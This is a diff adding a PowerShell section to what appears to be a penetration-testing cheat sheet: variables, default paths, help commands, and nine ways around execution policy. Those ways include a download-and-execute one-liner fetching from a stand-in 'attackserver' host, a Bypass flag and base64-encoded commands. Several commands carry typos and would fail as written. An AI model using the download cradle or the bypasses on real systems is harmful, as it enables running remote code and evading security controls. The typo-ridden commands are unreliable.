@@ -924,9 +924,92 @@ echo %ip%
 # WMIC
 [Index](#index)
 
-# powershell
+# Powershell
 [Index](#index)
 
+To set variables in powershell just do varbialbe_name=value. Note variables must start with the $ in powershell.(note that you NEED the quotes when not using a cmdlet)
+
+```powershell
+$ip='10.10.10.25'
+echo $ip
+10.10.10.25
+
+# Another way using cmdlets
+Set-Variable ip 10.10.10.26
+get-variable ip
+
+Name                           Value
+----                           -----
+ip                             10.10.10.26
+``` 
+
+Keep these in-mind when looking at the following commands if they have a variable. it should be reset to your own value.
+
+## Default Locations on windows
+
+32bit
+```powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+```
+
+63bit
+```powershell
+C:\windows\syswow64\windowspowershell\v1.0\powershell
+```
+
+## Basic Commands
+
+| Command | Description |
+| :-: | --- |
+| `Get-Help *` | Llist everything loaded |
+| `Get-Help process` | List everything containing "process" |
+| `Get-Help Get-Iten -Full` | Get full help about a topic |
+| `Get-Help Get-Item -Examples` | Get a list of examples |
+| `Import-Module $module_path` | Import a module into session |
+| `get-command -Module $module_name` | Get info on commands in a moduel |
+
+## Execution Policy
+
+Default is restricted, meaning some steps need to be taken in order to get powershell scripts to run on windows systems by default
+
+![image](https://user-images.githubusercontent.com/83407557/174350045-0dc72843-05fe-4629-87fa-3df9e4ade822.png)
+
+There are several ways to get around this however, each of these is a standalone method:
+
+1. Copy and paste into a terminal
+
+2. Read and Execute
+```powershell
+Get-Content script.ps1 | PowerShell.exe -noprofile-
+```
+3. Read and Execute
+```powershell
+Get-Contrent script.ps1 | Invoke-Expression
+```
+4. Use other execution policy
+```powershell
+PowerShell.exe -ExecutionPolicy Bypass -File script.ps1
+```
+5. Changing a user's execution policy
+```powershell
+Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+```
+6. Change execution policy for this session
+```powershell
+Set-ExecutionPolicy Bypass -Scope Process
+```
+7. Download and execute
+```powershell
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://attackserver/script.ps1')"
+```
+8. Use command switch
+```powershell
+Powershell -command "Write-Host 'Hello World'"
+```
+9. Use EncodeCommand
+```powershell
+$command = "Write-Host 'Hello World'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
+```
 # Windows Scripting
 [Index](#index)
 
